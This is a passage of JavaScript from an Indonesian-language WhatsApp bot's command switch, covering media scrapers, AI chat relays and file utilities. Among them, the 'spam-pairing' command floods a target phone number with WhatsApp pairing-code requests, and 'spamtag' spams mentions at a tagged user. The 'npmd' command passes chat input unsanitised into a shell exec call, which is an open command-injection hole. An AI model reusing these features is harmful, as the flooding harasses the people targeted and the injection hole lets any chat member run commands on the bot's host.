 if (video) {
 let aras = (`Judul: ${video.title}\nLink: ${video.source}`); // Mengirimkan judul dan link video
 await Yasam.sendMessage(m.chat, {
 video: {
 url: `${video.source}`
 },
 caption: aras,
 ptv: true,
 mimetype: "video/mp4"
 }, {
 quoted: m
 })
 } else {
 m.reply("Tidak ada video yang ditemukan."); // Pesan jika tidak ada video
 }
}
break
case 'swanime':{
//wm senn
async function animeVideo2() {
//wm senn 
	const url = "https://mobstatus.com/anime-whatsapp-status-video/"; // Ganti dengan URL yang sesuai
	const response = await fetch(url);
//wm senn
	const html = await response.text();
	const $ = cheerio.load(html);
//wm senn 
	const videos = [];
//wm senn
	const title = $("strong").text();
//wm senn
//wm senn 
	$(
		"a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy",
	).each((index, element) => {
		const href = $(element).attr("href");
		videos.push({
			title,
			source: href,
//wm senn
		});
	});
//wm senn
	const randomIndex = Math.floor(Math.random() * videos.length);
//wm senn
	const randomVideo = videos[randomIndex];
//wm 
	return randomVideo;
}
replygcxeon (mess.wait)
let data = await animeVideo2()
 await Yasam.sendFile(m.chat, data.source, null, data.title, m)
//wm senn
}
 break
case 'listpc': {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 Yasam.sendTextWithMentions(m.chat, teks, m)
 }
 break 
case "cekidgc": {
 if (!YasamCreator) return replygcxeon (mess.owner)
let getGroups = await Yasam.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Yasam.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcxeon(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case 'npmd': {
 if (!text) return reply(`*Contoh* : ${prefix + command} yt-search,versi(opsional)`)
 async function npmdownloader(pkg, pkgver) {
 try {
 const filePath = await new Promise((resolve, reject) => {
 exec(`npm pack ${pkg}@${pkgver}`, (error, stdout, stderr) => {
 if (error) {
 replygcxeon('Error atau Package tidak ditemukan');
 console.error(`exec error: ${error}`);
 reject(error);
 return;
 }
 resolve(stdout.trim());
 });
 });

 const fileName = filePath.split('/').pop();
 const data = await fs.promises.readFile(filePath);
 let Link;
 if (pkgver === 'latest') {
 Link = `https://www.npmjs.com/package/${pkg}`;
 } else {
 Link = `https://www.npmjs.com/package/${pkg}/v/${pkgver}`;
 }
 await Yasam.sendMessage(m.chat, {
 document: data,
 mimetype: "application/gzip",
 fileName: fileName,
 caption: `- \`Nama\`: ${fileName}\n- \`Versi\`: ${pkgver}\n- \`Link\`: ${Link}`
 }, {
 quoted: fvrif
 });

 await fs.promises.unlink(filePath);
 } catch (err) {
 console.error(`Error: ${err}`);
 }
 }
 Yasam.sendMessage(m.chat, {
 react: {
 text: "⏱",
 key: m.key,
 }
 })
 try {
 const [text2, ver] = text.split(",")
 await npmdownloader(text2, ver || 'latest')
 } catch (error) {
 replygcxeon('Sepertinya terjadi kesalahan atau package tidak ditemukan')
 }
 }
 break 
case 'get': {
if (!text) return replygcxeon(`awali *URL* dengan http:// atau https://`)
replygcxeon(mess.wait)
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return replygcxeon(JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return replygcxeon(textData);
} else if (text.includes('webp')) {
return Yasam.sendMessage(m.chat, { sticker: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/6283824196477/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Hann`,
 sourceUrl: "",
 thumbnailUrl: 'https://pomf2.lain.la/f/12l4qo2y.jpg'
 }
 }}, { quoted: fvrif })
} else if (/image/i.test(contentType)) { return Yasam.sendMessage(m.chat, {image: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/6283824196477/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Hann`,
 sourceUrl: "",
 thumbnailUrl: 'https://pomf2.lain.la/f/12l4qo2y.jpg'
 }
 }}, { quoted: fvrif })
} else if (/video/i.test(contentType)) { return Yasam.sendMessage(m.chat, {video: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/6283824196477/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Hann`,
 sourceUrl: "",
 thumbnailUrl: 'https://pomf2.lain.la/f/12l4qo2y.jpg'
 }
 }}, { quoted: fvrif })
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return Yasam.sendMessage(m.chat, {audio: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/6283824196477/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Hann`,
 sourceUrl: "",
 thumbnailUrl: 'https://pomf2.lain.la/f/12l4qo2y.jpg'
 }
 }}, { quoted: fvrif })
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return Yasam.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: fvrif },
		);			
} else if (/application\/pdf/i.test(contentType)) {
return Yasam.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: fvrif },
		);
} else {
return replygcxeon(`MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return replygcxeon(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
}}
break
case 'morse': {
 if (!q) return replygcxeon('⚠ *Masukkan Teks Yang Ingin Diubah Menjadi Sandi Morse*');
 try {
 replygcxeon('☕ *Mengubah Teks Menjadi Morse*');
 
// WM YANZOFFC
 const apiUrl = `https://restapi.yanzoffc.xyz/morse?text=${encodeURIComponent(q)}`;
 
 const { data } = await axios.get(apiUrl);
 
 if (data.status === 200 && data.data) {
 const morseCode = data.data.morseCode;
 const originalText = data.data.originalText;

//WM YANZOFFC
 let responseMessage = `*Teks Asli :*\n_${originalText}_\n\n*Sandi Morse:*\n${morseCode}`;
 replygcxeon(responseMessage);
 } else {
 replygcxeon('⚠️ *Gagal Mengonversi Teks Menjadi Sandi Morse!*');
 }
 } catch (err) {
 console.error(err);
 replygcxeon('⚠️ *Terjadi Kesalahan Saat Mengakses API!*');
 }
}
break 
 	case 'gpt':{
	 if (!text) {
 return m.reply('> ✨Hallo ada yang bisa saya bantu?');
 }

 try {
 console.log('Sending initial image...');
 const { key } = await Yasam.sendMessage(m.chat, {
 image: {
 url: 'https://telegra.ph/file/f4863e1811d18f6f7c011.jpg'
 },
 caption: 'Processing your request, please wait...'
 }, {
 quoted: fvrif,
 mentions: [m.sender]
 });

 console.log('Fetching GPT-4 response...');
 const result = await gpt4(text);
 
 if (!result || !result.reply) {
 console.error('Error: No valid response from GPT-4 API');
 return m.reply('Sorry, I could not process your request. Please try again later.');
 }

 await sleep(500);
 console.log('Sending final response with GPT-4 result...');
 await Yasam.sendMessage(m.chat, {
 image: {
 url: 'https://telegra.ph/file/f4863e1811d18f6f7c011.jpg'
 },
 caption: '\n> ✨' + result.reply,
 edit: key
 }, {
 quoted: fvrif,
 mentions: [m.sender]
 });

 } catch (e) {
 console.error('Error occurred:', e);
 await m.reply('An error occurred while processing your request.');
 }
};
break
 	case 'blackbox': { 
 const { randomBytes, randomUUID } = require("crypto");
const api = 'https://www.blackbox.ai/api/chat';
const headers = {
 'User-Agent': 'Postify/1.0.0',
 'Accept': '*/*',
 'Referer': 'https://www.blackbox.ai',
 'Content-Type': 'application/json',
 'Origin': 'https://www.blackbox.ai',
 'DNT': '1',
 'Sec-GPC': '1',
 'Connection': 'keep-alive'
};

const request = (chat) => chat.map(({ files, ...rest }) => rest);
const rhex = (bytes) => randomBytes(bytes).toString('hex');
const uuid = () => randomUUID();

const config = (model) => ({
 trendingAgentMode: model[model] || {},
 userSelectedModel: defaultModel[model] || undefined,
 ...po[model]
});

const model = {
 blackbox: {},
 'llama-3.1-405b': { mode: true, id: 'llama-3.1-405b' },
 'llama-3.1-70b': { mode: true, id: 'llama-3.1-70b' },
 'gemini-1.5-flash': { mode: true, id: 'Gemini' }
};

const defaultModel = {
 'gpt-4o': 'gpt-4o',
 'claude-3.5-sonnet': 'claude-sonnet-3.5',
 'gemini-pro': 'gemini-pro'
};

const po = {
 'gpt-4o': { maxTokens: 4096 },
 'claude-3.5-sonnet': { maxTokens: 8192 },
 'gemini-pro': { maxTokens: 8192 }
};

const clear = (response) => {
 return response.replace(/\$~~~\$(.*?)\$~~~\$/g, '').trim();
};

const BlackBox = {
 async generate(chat, options, { max_retries = 5 } = {}) {
 const random_id = rhex(16);
 const random_user_id = uuid();
 chat = request(chat);

 const data = {
 messages: chat,
 id: random_id,
 userId: random_user_id,
 previewToken: null,
 codeModelMode: true,
 agentMode: {},
 ...config(options.model),
 isMicMode: false,
 isChromeExt: false,
 githubToken: null,
 webSearchMode: true,
 userSystemPrompt: null,
 mobileClient: false,
 maxTokens: 100000,
 playgroundTemperature: parseFloat(options.temperature) || 0.7,
 playgroundTopP: 0.9,
 validated: "69783381-2ce4-4dbd-ac78-35e9063feabc",
 };

 try {
 const response = await fetch(api, { method: 'POST', headers, body: JSON.stringify(data) });
 if (!response.ok) {
 throw new Error(`${await response.text()}`);
 }

 let tc = await response.text();
 let tr = clear(tc);


 if (tr.includes("$~~~$")) {
 data.mode = 'continue';
 if (!data.messages.some(msg => msg.content === tr)) {
 data.messages.push({ content: tr, role: 'assistant' });
 }

 const cor = await fetch(api, { method: 'POST', headers, body: JSON.stringify(data) });
 let ctc = await cor.text();
 tr += clear(ctc);
 }

 return tr; 

 } catch (err) {
 if (max_retries > 0) {
 console.error(err, "Mencoba ulang...");
 return this.generate(chat, options, { max_retries: max_retries - 1 });
 } else {
 throw err;
 }
 }
 }
};

 
 let { key } = await Yasam.sendMessage(m.chat, { text: "..." });
 try {
 // Pastikan minimal ada teks
 if (!text) return m.reply("Masukkan pertanyaan untuk dijawab!\n\n*Contoh:* Siapa presiden Indonesia?");

 // Siapkan chat untuk dikirim ke BlackBox
 const chatMessages = [{ role: 'user', content: text }];
 const options = { model: 'blackbox', temperature: 0.7 }; // Sesuaikan model dan suhu jika perlu

 const responseMessage = await BlackBox.generate(chatMessages, options);

 await Yasam.sendMessage(m.chat, {
 text: responseMessage,
 edit: key,
 });
 } catch (error) {
 await Yasam.sendMessage(m.chat, {
 text: `Error: ${error.message}`,
 edit: key,
 });
 }
}
break
case 'getpp':{
	if (!m.isGroup) return replygcxeon ("Digunakan Khsus Dalam Group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
 var ppuser = await Yasam.profilePictureUrl(ghosst, 'image')
} catch (err) {
 var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
Yasam.sendMessage(from, { image: { url: ppuser }}, { quoted: fvrif })
}
break
case "cerpen":
if (!text) return replygcxeon('`Masukan type: .cerpen anak`')
 function cerpen(category) {
 return new Promise(async (resolve, reject) => {
 try {
 let title = category.toLowerCase().replace(/[()*]/g, "");
 let judul = title.replace(/\s/g, "-");
 let page = Math.floor(Math.random() * 5) + 1; 

 let get = await axios.get('http://cerpenmu.com/category/cerpen-' + judul + '/page/' + page);
 let $ = cheerio.load(get.data);
 let link = [];

 $('article.post').each(function (a, b) {
 link.push($(b).find('a').attr('href'));
 });

 if (link.length === 0) {
 return reject("No stories found for this category.");
 }

 let random = link[Math.floor(Math.random() * link.length)];
 let res = await axios.get(random);
 let $$ = cheerio.load(res.data);

 let hasil = {
 title: $$('#content > article > h1').text(),
 author: $$('#content > article').text().split('Cerpen Karangan: ')[1]?.split('Kategori: ')[0]?.trim(),
 kategori: $$('#content > article').text().split('Kategori: ')[1]?.split('\n')[0]?.trim(),
 lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1]?.split('\n')[0]?.trim(),
 cerita: $$('#content > article > p').text()
 };

 resolve(hasil);
 } catch (error) {
 reject(error);
 }
 });
}


 try {
 var data = await cerpen(text);
 var textpp = `Title : ${data.title}\n`;
 textpp += `Author : ${data.author}\n`;
 textpp += `Category : ${data.kategori}\n`;
 textpp += `Approved on : ${data.lolos}\n`;
 textpp += `Story :\n${data.cerita}`;

 reply(textpp);
 } catch (error) {
 console.error(error);
 replygcxeon("An error occurred while fetching the story.");
 }
break

case 'daftar': case 'regis': case 'register': {
if (isRegistered) return reply('Kamu sudah terdaftar')
const serialUser = createSerial(20)
mzd = `「 SUCCES TERDAFTAR 」

 • Phone Nunber : @${m?.sender.split('@')[0]}
 • Name User : ${pushname}
 • Status Verify : Berhasil
 • ID User : ${serialUser}

Done Bwang Kuhhh Kamu Sekarang Sudah Bisa Mengakses ${botname} Abangkuhh Btw Limit Gada Reset Reset an Jika Limit Habis Silahkan Buy Limit Di Yasam_id`
veri = m?.sender
if (!m.isGroup) {
addRegisteredUser(m?.sender, pushname, serialUser)
Yasam.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `R E G I S T E R E D`,
body: '',
thumbnailUrl: 'https://files.catbox.moe/dyujn8.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
} else {
addRegisteredUser(m?.sender, pushname, serialUser)
Yasam.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | R E G I S T E R`,
body: '',
thumbnailUrl: 'https://files.catbox.moe/dyujn8.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
}
break

case 'videy': {
 if (!text) return m.reply("mana linknya?");
 
 await Yasam.sendMessage(m.chat, { react: { text: "🕓" ,key: m.key } });
 
 var anu = text.replace("v?id=", "");
 var dompResult = anu.replace("https://", "https://cdn.");
 
 Yasam.sendMessage(m.chat, { 
 video: { url: dompResult + ".mp4" }, 
 caption: '```Success...\nDont forget to donate```' 
 }, { quoted: m });
 
}
break 	
case "splay": {
 const axios = require("axios");
 if (!text) return m.reply('Masukkan Judul Contoh\nContoh `La Vagualette!`');

 await reply("Mohon Tunggu Sebentar...");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
 if (!data) return reply("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `_###_ *SPOTIFY PLAYER* _###_

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await Yasam.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await Yasam.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan file audio.");
 }
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat mengambil file audio.");
 }
}
break; 	
case 'spamtag': {
 if (!m.mentionedJid[0]) {
 return m.reply('Tag orangnya!!\n\nExample: .spamtag @abay | 10');
 }

 const [orang, amountStr] = text.split("|").map(item => item.trim());
 const amount = parseInt(amountStr, 10);

 if (isNaN(amount) || amount <= 0) {
 return m.reply('Jumlah harus berupa angka positif!');
 }

 for (let i = 0; i < amount; i++) {
 Yasam.sendMessage(m.chat, {
 text: orang,
 mentions: [m.mentionedJid[0]]
 });
 await sleep(500) 
 }
}
break
case 'soundcloudsearch':
			case 'scsearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(`⚠️ Eits, kakak lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *${prefix + command} DJ mama muda* biar Mora bisa bantu cari yang kakak mau! 🔍💬`);
				try {
					let results = await scrapeSoundCloud(text);	// Panggil fungsi scraper untuk SoundCloud
					if (results.length === 0) return replygcxeon('😔 Maaf, kak! Tidak ada hasil yang ditemukan. Coba kata kunci yang lain ya!');
					let teks = `🎧 *Hasil Pencarian SoundCloud untuk:* ${text}\n\n`;
					let list = '';
					let no = 1;
					for (let i of results) {
						list += `\n${no++}. 🎵 *${i.title}*\n` +
							`🔗 *Link:* ${i.url}\n`;
					}
					await Yasam.sendMessage(
						m.chat,
						{
							text: teks + list
						},
						{ quoted: m }
					);
				} catch (error) {
					console.log(error);
					replygcxeon('⚠️ Terjadi kesalahan saat mencari data di SoundCloud, coba lagi nanti ya!');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'encrypthard': {

if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
 target: "node",
 preset: "high",
 compact: true,
 minify: true,
 flatten: true,

 identifierGenerator: function() {
 const originalString = 
 "素晴座素晴難Cella素晴座素晴難" + 
 "素晴座素晴難Cella素晴座素晴難";
 
 // Fungsi untuk menghapus karakter yang tidak diinginkan
 function removeUnwantedChars(input) {
 return input.replace(
 /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
 );
 }

 // Fungsi untuk menghasilkan string acak
 function randomString(length) {
 let result = '';
 const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
 const charactersLength = characters.length;

 for (let i = 0; i < length; i++) {
 result += characters.charAt(
 Math.floor(Math.random() * charactersLength)
 );
 }
 return result;
 }

 return removeUnwantedChars(originalString) + randomString(2);
 },

 renameVariables: true,
 renameGlobals: true,

 stringEncoding: true,
 stringSplitting: 0.0,
 stringConcealing: true,
 stringCompression: true,
 duplicateLiteralsRemoval: 1.0,

 shuffle: {
 hash: 0.0,
 true: 0.0
 },

 stack: true,
 controlFlowFlattening: 1.0,
 opaquePredicates: 0.9,
 deadCode: 0.0,
 dispatcher: true,
 rgf: false,
 calculator: true,
 hexadecimalNumbers: true,
 movedDeclarations: true,
 objectExtraction: true,
 globalConcealing: true 
}).then(async (obfuscated) => {
 await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
 await Yasam.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

case 'brat':{
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await Yasam.sendImageAsSticker(m.chat, buf.image, m, { packname: "Liyaa MD", author: "Hann Universe!!" })
}
break
case 'beautify':{
 const usage = "*Example:*\n" + prefix + command + " --js (Input text or reply text to beautify code)"
 let text
 if (args.length >= 2) text = args.slice(1).join(" ")
 else {
 if (!m.quoted || !m.quoted?.text) return replygcxeon(usage)
 text = m.quoted?.text
 }
 const option = args[0]
 if (option === "--js") {
 const beautifulJS = js_beautify(text)
 await replygcxeon(beautifulJS)
 } else if (option === "--css") {
 const beautifulCSS = css_beautify(text)
 await replygcxeon(beautifulCSS)
 } else if (option === "--html") {
 const beautifulHTML = html_beautify(text)
 await replygcxeon(beautifulHTML)
 } else {
 await replygcxeon(usage)
 }
}
break 
case "tes": case "bot":{
replygcxeon('_*Bot Sudah Aktif Kak*_')
}
break
case 'spam-pairing': {
if (!YasamCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break

case 'convertcode': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null

 if (!quo) return m.reply(`Masukkan atau reply kode yang ingin diubah`);

function convertCJSToESM(code) {
 return code
 .replace(/const (\w+) = require\(['"](.+?)['"]\);?/g, 'import $1 from \'$2\';')
 .replace(/let (\w+) = require\(['"](.+?)['"]\);?/g, 'import $1 from \'$2\';')
 .replace(/var (\w+) = require\(['"](.+?)['"]\);?/g, 'import $1 from \'$2\';')
 .replace(/module\.exports\s*=\s*(.*?);?/g, 'export default $1;')
 .replace(/exports\.(\w+)\s*=\s*(.*?);?/g, 'export const $1 = $2;')
 .replace(/require\(['"](.+?)['"]\)/g, 'await import(\'$1\')'); // Menangani dynamic imports
}

function convertESMToCJS(code) {
 return code
 .replace(/import (\w+) from ['"](.+?)['"];/g, 'const $1 = require(\'$2\');')
 .replace(/import \* as (\w+) from ['"](.+?)['"];/g, 'const $1 = require(\'$2\');')
 .replace(/import \{(.*?)\} from ['"](.+?)['"];/g, (match, p1, p2) => {
 const imports = p1.split(',').map(i => i.trim());
 return `const { ${imports.join(', ')} } = require('${p2}');`;
 })
 .replace(/export default (\w+);?/g, 'module.exports = $1;')
 .replace(/export const (\w+) = (\w+);?/g, 'exports.$1 = $2;')
 .replace(/export (.*?) from ['"](.+?)['"];/g, (match, p1, p2) => {
 return `module.exports.${p1} = require('${p2}');`;
 }); // Menangani re-export
}

 let result;
 if (args[0] === '--esm') {
 result = convertCJSToESM(quo);
 } else if (args[0] === '--cjs') {
 result = convertESMToCJS(quo);
 } else {
 return m.reply(`Perintah tidak dikenal`);
 }

 m.reply(result);
}
break 
case 'createfile': {
 const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null
 if (!quo) return m.reply("masukan teks yang ingin dimasukkan pada file nya")
 try {
 let type;
 let mime;
 if (args[0] === "--js") {
 type = ".js"
 mime = "application/javascript"
 } else if (args[0] === "--html") {
 type = ".html"
 mime = "text/html"
 } else if (args[0] === "--ruby") {
 type = ".rb"
 mime = "application/x-ruby"
 } else if (args[0] === "--py") {
 type = ".py"
 mime = "text/x-python"
 } else if (args[0] === "--jv") {
 type = ".java"
 mime = "text/x-java-source"
 } else if (args[0] === "--json") {
 type = ".json"
 mime = "application/json"
 } else if (args[0] === "--c") {
 type = ".c"
 mime = "text/x-c"
 } else if (args[0] === "--cpp") {
 type = ".cpp"
 mime = "text/x-c++src"
 } else if (args[0] === "--ct") {
 type = ".cs"
 mime = "text/x-csharp"
 } else if (args[0] === "--php") {
 type = ".php"
 mime = "application/x-httpd-php"
 } else if (args[0] === "--ts") {
 type = ".ts"
 mime = "application/x-typescript"
 } else if (args[0] === "--go") {
 type = ".go"
 mime = "text/x-go"
 } else if (args[0] === "--lua") {
 type = ".lua"
 mime = "text/x-lua"
 } else if (args[0] === "--css") {
 type = ".css"
 mime = "text/css"
 } else if (args[0] === "--txt") {
 type = ".txt"
 mime = "text/plain"
 } else {
 m.reply(`Perintah tidak dikenali. file type yang tersedia
 
 --js ( *JavaScript* )
 --html ( *Html* )
 --ruby ( *Ruby* )
 --py ( *Python* )
 --jv ( *Java* )
 --json ( *Json* )
 --c ( *C* )
 --cpp ( *C++* )
 --ct ( *C#* )
 --php ( *PHP* )
 --ts ( *TypeScript* )
 --go ( *GoLang* )
 --lua ( *Lua* )
 --css ( *CSS* )
 --txt ( *Text/Txt* )
 `)
 }
 
 let tipe = `file_${Date.now()}${result}`
 await fs.writeFile(tipe, quo)
 let ngirim;
 if (args[1] === "--group") {
 ngirim = await Yasam.sendMessage(m.chat, { document: await fs.readFileSync(tipe), fileName: tipe, mimetype: mime }, { quoted: m })
 } else if (args[1] === "--private") {
 ngirim = await Yasam.sendMessage(m.sender, { document: await fs.readFileSync(tipe), fileName: tipe, mimetype: mime }, { quoted: m })
 } else {
 m.reply(`Perintah tidak dikenali. mau kirim kemana? disini atau di grup?
 
 --group ( *Di Grup* )
 --private ( *Di Pribadi Chat* )
 `)
 }
 
 return ngirim
 } catch (e) {
 m.reply(`${e.message}`)
 console.log(e.message)
 }
}
break 
 case 'alkitab': { 
const axios = require('axios')
const cheerio = require('cheerio')
 
     if (!text) return m.reply(`uhm.. teksnya mana?\n\ncontoh:\n${prefix + command} kejadian`)
     let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } }) 
     let $ = cheerio.load(res.data) 
     let result = [] 
     $('div.vw').each(function (a, b) { 
         let teks = $(b).find('p').text().trim() 
         let link = $(b).find('a').attr('href') 
         let title = $(b).find('a').text().trim() 
         result.push({ teks, link, title }) 
     }) 
 
 let foto = 'https://telegra.ph/file/a333442553b1bc336cc55.jpg'
 let judul = '*────────「 Alkitab 」 ────────*'
     let caption = result.map(v => `💌 ${v.title}\n📮 ${v.teks}`).join('\n┄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┄\n') 
      Yasam.sendFile(m.chat, foto, 'alkitab.jpg', `${judul}\n\n${caption}`, m)
 } 
break

case 'tourl': {
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const fakeUserAgent = require("fake-useragent");
const { filesize } = require('filesize');
	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || ''
	const createFormData = (content, fieldName, ext) => {
 const { mime } = fromBuffer(content) || {};
 const formData = new FormData();
 formData.append(fieldName, content, `${new Date()}.${ext}`);
 return formData;
};

const catbox = async (content) => {
 try {
 /*
 @ CatBox Uploader
 $ Create by Syaii
 */
 const { ext, mime } = (await fromBuffer(content)) || {};
 const formData = createFormData(content, "fileToUpload", ext);
 formData.append("reqtype", "fileupload");
 const response = await fetch("https://catbox.moe/user/api.php", {
 method: "POST",
 body: formData,
 headers: {
 "User-Agent": fakeUserAgent(),
 },
 });
 return await response.text();
 } catch (error) {
 throw false;
 }
 }
	if (!mime) return reply('reply media!')
	reply("Mohon Tunggu Sebentar...")
	let media = await q.download()
	let link = await catbox(media)
	let size = await fetch(link)
	size = await size.text()
	size = await filesize(size.length)
	let caption = `*SUCCES UPLOAD A FILE*

📊 *S I Z E :* ${size} Byte
🔗 *L I N K :* ${link} !
`
await Yasam.sendMessage(m.chat,{image: {url: link}, caption: caption }, { quoted: m })
}
break
case 'getpb': {
 const link = args[0]?.trim();
 if (!link) return m.reply('mana!'); 
 if (!/^https:\/\/pastebin\.com\/[a-zA-Z0-9]+$/.test(link)) return m.reply('url gk valid');
